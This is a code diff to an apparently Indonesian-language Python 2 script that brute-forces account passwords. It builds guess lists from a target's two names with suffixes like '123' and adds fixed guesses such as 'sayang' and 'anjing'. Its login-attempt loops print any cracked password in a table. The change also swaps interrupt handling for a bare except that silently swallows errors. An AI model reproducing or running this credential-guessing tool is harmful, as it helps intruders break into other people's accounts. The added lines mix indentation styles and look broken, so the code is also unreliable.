@@ -32,10 +32,12 @@ def Wordlist():
 		lis = ['123','1234','12345']
 		for dev in lis:
 			deV.append(nama1+dev)
+                deV.append('sayang')
 		deV.append(nama1+nama2)
 		deV.append(nama1+nama2+'123')
 		for dev in lis:
 			DEv.append(nama2+dev)
+                DEv.append('anjing')
 		DEv.append(nama2+nama1)
 		DEv.append(nama2+nama1+'123')
 
@@ -105,7 +107,7 @@ def target():
 	
 
 def br_dev1(deV):
-	
+	        usr = open('pass.txt', 'r').read()
 		for Dev in deV:
 		  try:
 			wak = time.ctime()
@@ -125,15 +127,16 @@ def br_dev1(deV):
 				x.add_column("Password", [pas])
 				print x
 			##	data()
+                                print '\n Tekan CTRL + Z Untuk menghentikan..\n '
 				exit("\n Keluar....")
-		  except KeyboardInterrupt:
-			exit()
+		  except:
+			pass
 		  	
 		
 
 
 def br_dev2(DEv):
-
+                usr = open('pass.txt', 'r').read()
 		for Dev in DEv:
 		  try:
 			wak = time.ctime()
@@ -153,9 +156,10 @@ def br_dev2(DEv):
 				x.add_column("Password", [pas])
 				print x
 			##	data()
+                                print '\n Tekan CTRL + Z Untuk menghentikan..\n '
 				exit("\n Keluar....")
-		  except KeyboardInterrupt:
-			exit()
+		  except:
+			pass
 
 def brute():
 	Wordlist()
